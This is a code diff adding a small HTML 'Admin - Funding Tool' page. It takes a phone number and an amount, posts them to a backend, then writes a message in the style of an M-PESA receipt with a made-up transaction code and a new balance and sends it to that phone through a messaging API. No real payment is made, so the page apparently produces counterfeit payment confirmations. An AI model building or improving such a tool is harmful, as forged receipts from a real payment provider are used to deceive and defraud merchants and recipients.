@@ -1,0 +1,220 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin - Funding Tool</title>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            background: #121212; 
+            color: white; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            padding: 20px; /* Prevents box from touching edges on small screens */
+            box-sizing: border-box;
+        }
+
+        .fund-box { 
+            background: #1e1e1e; 
+            border: 2px solid #4CAF50; 
+            padding: 30px; 
+            border-radius: 15px; 
+            width: 100%; /* Flexible width */
+            max-width: 350px; /* Limits size on desktop */
+            text-align: center; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            border-radius: 8px; 
+            border: 1px solid #444; 
+            background: #121212; 
+            color: white; 
+            box-sizing: border-box; 
+            font-size: 16px; /* Prevents iOS zoom on focus */
+        }
+
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background: #4CAF50; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            font-size: 16px;
+            margin-top: 10px;
+        }
+
+        button:hover { 
+            background: #45a049; 
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            background: #444;
+            cursor: not-allowed;
+        }
+
+        #status { 
+            margin-top: 15px; 
+            color: #aaa; 
+            font-size: 14px; 
+            word-wrap: break-word;
+        }
+
+        .loader {
+            display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="fund-box">
+    <h2 style="color: #4CAF50; margin-top: 0;">Fund Account</h2>
+    <p style="margin-bottom: 20px; color: #ccc;">Enter details to add balance</p>
+    
+    <input type="text" id="phone" placeholder="User Phone Number">
+    <input type="number" id="amount" placeholder="Amount (e.g. 5000)">
+    
+    <button onclick="submitFunds()">Add Funds Now</button>
+    
+    <p id="status"></p>
+</div>
+
+<script>
+    async function submitFunds() {
+        const phone = document.getElementById('phone').value;
+        const amount = document.getElementById('amount').value;
+        const status = document.getElementById('status');
+
+        if(!phone || !amount) {
+            status.style.color = "#ff5252";
+            status.innerText = "Please fill all fields";
+            return;
+        }
+
+        const payBtn = document.querySelector('button');
+        payBtn.disabled = true;
+        payBtn.innerHTML = '<span class="loader"></span>Processing...';
+        status.style.color = "#aaa";
+        status.innerText = "Processing...";
+
+        try {
+            const response = await fetch('https://funds-mauve.vercel.app/api/fund', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, amount })
+            });
+            const result = await response.json();
+            
+            if (response.ok) {
+                // Generate token and confirmation message
+                const token = generateToken();
+                const dateStr = formatNumericDate();
+                const timeStr = formatTime12Hour();
+                const newBalance = result.newBalance || 0;
+                
+                const confirmationMsg = `${token} Confirmed.You have received Ksh${parseFloat(amount).toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${newBalance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
+
+                // Send confirmation message to message API
+                fetch('https://message-server-five.vercel.app/api/messages', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: phone,
+                        message: confirmationMsg,
+                        type: 'received'
+                    })
+                }).catch(err => {
+                    console.warn("Confirmation message failed to send:", err);
+                });
+
+                status.style.color = "#4CAF50";
+                status.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amount} added to account.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
+                setTimeout(() => resetUI(), 3000);
+            } else {
+                status.style.color = "#ff5252";
+                status.innerText = result.error || "Transaction failed";
+                resetUI();
+            }
+        } catch (err) {
+            status.style.color = "#ff5252";
+            status.innerText = "Error: Backend not reachable";
+            resetUI();
+        }
+    }
+
+    function resetUI() {
+        const payBtn = document.querySelector('button');
+        payBtn.disabled = false;
+        payBtn.innerText = "Add Funds Now";
+    }
+
+    // ─── Token format helpers ──────────────────────────────────────
+    function getYearLetter() {
+        const year = new Date().getFullYear();
+        const offset = year - 2026;
+        return String.fromCharCode(85 + offset);
+    }
+
+    function getMonthThirdLetter() {
+        const thirdLetters = "ABCDEFGHIJKLMN";
+        return thirdLetters[new Date().getMonth()];
+    }
+
+    function getDayCode() {
+        const day = new Date().getDate();
+        if (day <= 9) {
+            return day.toString();
+        } else {
+            return String.fromCharCode(65 + (day - 10));
+        }
+    }
+
+    function formatNumericDate() {
+        const now = new Date();
+        const day = now.getDate().toString().padStart(2, '0');
+        const month = (now.getMonth() + 1).toString().padStart(2, '0');
+        const year = now.getFullYear();
+        return `${day}/${month}/${year}`;
+    }
+
+    function formatTime12Hour() {
+        const now = new Date();
+        return now.toLocaleTimeString('en-US', {
+            hour: 'numeric',
+            minute: '2-digit',
+            hour12: true
+        });
+    }
+
+    function generateToken() {
+        const yearLetter = getYearLetter();
+        const monthLetter = getMonthThirdLetter();
+        const dayCode = getDayCode();
+        const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
+        return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
+    }
+    // ─────────────────────────────────────────────────────────────────
+</script>
+
+</body>
+</html>
